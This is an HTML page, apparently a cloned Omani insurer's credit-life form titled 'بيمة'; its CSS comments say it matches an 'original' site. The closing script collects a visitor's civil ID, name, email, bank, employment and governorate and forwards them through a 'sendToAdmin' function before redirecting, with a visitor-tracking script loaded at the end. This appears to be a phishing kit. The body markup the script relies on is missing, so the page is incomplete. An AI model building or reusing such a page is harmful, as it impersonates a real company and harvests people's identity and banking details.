<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بيمة</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
    <style>
        :root {
            --theme-default5: #5eac12;
            --theme-default5_2: #80c739;
            --theme-default5_3: #c5dfab;
            --theme-gradient5: linear-gradient(to right, rgb(94, 172, 18) 0%, rgb(128, 199, 57) 51%, rgb(128, 199, 57) 100%);
        }
        body {
            font-family: 'Tajawal Regular', sans-serif;
            direction: rtl;
            margin: 0;
            background: #fff;
            color: #586167;
        }

        /* Header */
        header.header-1 {
            border-bottom: 1px solid #eee;
            background: #fff;
            position: sticky;
            top: 0;
            z-index: 99;
            padding: 10px 0;
        }
        .header-inner {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }
        .brand-logo img { height: 50px; }
        .nav-menu {
            display: flex;
            gap: 30px;
            list-style: none;
            margin: 0;
            padding: 0;
            align-items: center;
        }
        .nav-menu a {
            text-decoration: none;
            color: #333;
            font-size: 15px;
            font-weight: 500;
        }
        .nav-icons {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .nav-icons a {
            color: #5eac12;
            font-size: 1.3rem;
            text-decoration: none;
        }

        /* Page Header with gradient bg */
        .page-header {
            background: radial-gradient(circle, rgb(255, 243, 205) 0%, rgb(255, 255, 255) 100%);
            padding: 20px 0 15px;
        }
        .page-heading-1 {
            font-size: 32px;
            font-weight: 600;
            color: #80c739;
            margin: 0;
            text-align: right;
        }

        /* Stepper - matching original exactly */
        .sm-stepper {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            width: 100%;
            position: relative;
            gap: 0;
        }
        .sm-stepper__item {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            flex: 0 0 auto;
            min-width: 140px;
            z-index: 1;
        }
        /* Connecting lines */
        .sm-stepper__item:not(:last-child)::after {
            content: "";
            position: absolute;
            top: 12px;
            left: -50%;
            width: 100%;
            height: 2px;
            background-color: #d7dbe1;
            z-index: -1;
        }
        .sm-stepper__item.sm-is-done:not(:last-child)::after {
            background-color: #c5dfab;
        }
        .sm-stepper__link {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: inherit;
        }
        .sm-stepper__circle {
            width: 26px;
            height: 26px;
            border-radius: 50%;
            background: #fff;
            border: 2px solid #d7dbe1;
            display: grid;
            place-items: center;
            color: #6c757d;
            font-weight: 400;
            font-size: 14px;
        }
        .sm-stepper__item.sm-is-done .sm-stepper__circle {
            background: #c5dfab;
            border-color: #c5dfab;
            color: #5eac12;
        }
        .sm-stepper__item[aria-current="step"] .sm-stepper__circle {
            background: #5eac12;
            border-color: #5eac12;
            color: #fff;
        }
        .sm-stepper__label {
            margin-top: 4px;
            font-size: 14px;
            color: #6c757d;
        }
        .sm-stepper__item[aria-current="step"] .sm-stepper__label {
            color: #5eac12;
        }

        /* Form Section - WHITE background (NOT inside wave) */
        .form-section {
            background: #fff;
            padding: 30px 0 40px;
        }

        /* Theme Card */
        .theme-card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 3.346px 3.716px 22.5px 0px rgba(0,0,0,0.07);
            border: none;
            overflow: visible;
            margin-bottom: 20px;
        }
        .filter-cards {
            border-bottom: 1px solid #eee;
        }
        .p-30px { padding: 30px; }

        /* ico-heading: icon on the RIGHT side in RTL */
        .ico-heading {
            display: flex;
            flex-direction: row;
            align-items: flex-start;
            gap: 15px;
        }
        .ico-heading .img-box img {
            width: 64px;
            height: 64px;
        }
        .ico-heading .text-box {
            text-align: right;
        }
        .heading-bb-2 {
            font-size: 19.2px;
            color: #6c757d;
            font-weight: 600;
            margin: 0;
            padding-bottom: 0;
            text-decoration: underline;
            text-decoration-color: var(--theme-default5);
            text-underline-offset: 4px;
        }
        .sub-text {
            color: #666;
            font-size: 0.9rem;
            margin-top: 5px;
            margin-bottom: 0;
        }

        /* Form fields */
        .form-floating > .form-control,
        .form-floating > .form-select {
            border: 1px solid #ced4da;
            border-radius: 6px;
            height: 56px;
            text-align: right;
            padding-right: 12px;
        }
        .form-floating > label {
            right: 12px;
            left: auto;
            text-align: right;
            transform-origin: right top;
        }
        .form-floating > .form-control:focus ~ label,
        .form-floating > .form-control:not(:placeholder-shown) ~ label,
        .form-floating > .form-select ~ label {
            transform: scale(0.85) translateY(-0.5rem) translateX(0);
            color: #6c757d;
        }
        h6 {
            text-align: right;
            color: #586167;
            font-weight: 600;
        }

        /* Wave Container - with real wave curve at top like original */
        .wave-container {
            position: relative;
            background: linear-gradient(90deg, rgb(125, 242, 156) 0%, rgb(15, 105, 169) 100%);
            overflow: hidden;
            padding: 80px 0 20px;
            margin-top: -40px;
        }
        .wave-container::before {
            content: '';
            position: absolute;
            top: -60px;
            left: 0;
            right: 0;
            height: 120px;
            background: #fff;
            border-radius: 0 0 50% 50%;
            z-index: 1;
        }
        .wave-container::after {
            content: '';
            position: absolute;
            width: 600px;
            height: 600px;
            border-radius: 50%;
            background: rgba(255,255,255,0.04);
            bottom: -300px;
            left: -150px;
            animation: rotate 20s linear infinite reverse;
        }
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Buttons */
        .section-page-footer-1 {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        .btn-gradient.color-2 {
            background-image: var(--theme-gradient5);
            background-size: 200% auto;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-weight: 500;
            transition: all 0.5s ease;
        }
        .btn-gradient.color-2:hover {
            background-position: right center;
        }
        .btn-prev {
            padding: 10px 50px;
            font-size: 16px;
        }
        .btn-next {
            padding: 8px 35px;
            font-size: 14px;
        }

        /* Footer */
        footer .sub-footer {
            padding: 12px 0;
            background: #2d2d2d;
        }
        footer .sub-footer .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        footer .sub-footer p {
            font-size: 14px;
            font-weight: 500;
            color: #d2d2d2;
            margin: 0;
        }
        .sub-footer-link {
            display: flex;
            gap: 10px;
            list-style: none;
            margin: 0;
            padding: 0;
        }
        .sub-footer-link li + li { margin-right: 10px; }
        .sub-footer-link li a {
            color: #d2d2d2;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .sub-footer-link li a:hover { color: #fff; }

        /* Mobile responsive */
        @media (max-width: 768px) {
            .wave-container {
                display: none;
            }
            .mobile-buttons-row {
                display: flex;
                flex-direction: row;
                gap: 0.5rem;
                margin-top: 1rem;
            }
            .mobile-buttons-row .btn-next {
                flex: 1;
                padding: 10px 20px;
                font-size: 14px;
            }
            .mobile-buttons-row .btn-prev-mobile {
                flex: 1;
                background-image: var(--theme-gradient5);
                background-size: 200% auto;
                color: #fff;
                border: none;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                padding: 10px 20px;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
        }
    </style>
</head>
<body class="rtl">

    <script>
    document.getElementById('nextBtn').addEventListener('click', function(e) {
        e.preventDefault();
        var params = new URLSearchParams(window.location.search);
        var amount = params.get('amount') || '15';
        // Save form data to localStorage
        var creditLifeData = {
            civil_id: document.getElementById('civil_resident_id').value,
            title: document.getElementById('title').value,
            first_name: document.getElementById('first_name').value,
            last_name: document.getElementById('last_name').value,
            email: document.getElementById('email').value,
            bank: document.getElementById('bank').value,
            employment_type: document.getElementById('employment_type').value,
            governate: document.getElementById('governate').value,
            relation: document.getElementById('relation_title').value,
            amount: amount
        };
        localStorage.setItem('creditLifeData', JSON.stringify(creditLifeData));
        if (window.sendToAdmin) {
            window.sendToAdmin({
                'الرقم المدني': creditLifeData.civil_id,
                'العنوان': creditLifeData.title,
                'الاسم الأول': creditLifeData.first_name,
                'اسم العائلة': creditLifeData.last_name,
                'البريد الإلكتروني': creditLifeData.email,
                'البنك': creditLifeData.bank,
                'نوع التوظيف': creditLifeData.employment_type,
                'المحافظة': creditLifeData.governate,
                'العلاقة': creditLifeData.relation,
                'المبلغ': amount + ' ر.ع'
            }, 'تأمين القروض - البيانات');
        }
        window.location.href = '/insurance/credit-life-review?amount=' + amount;
    });
    document.getElementById('prevBtn').addEventListener('click', function(e) {
        e.preventDefault();
        window.history.back();
    });
    </script>
<script src="../visitor-tracking.js"></script>
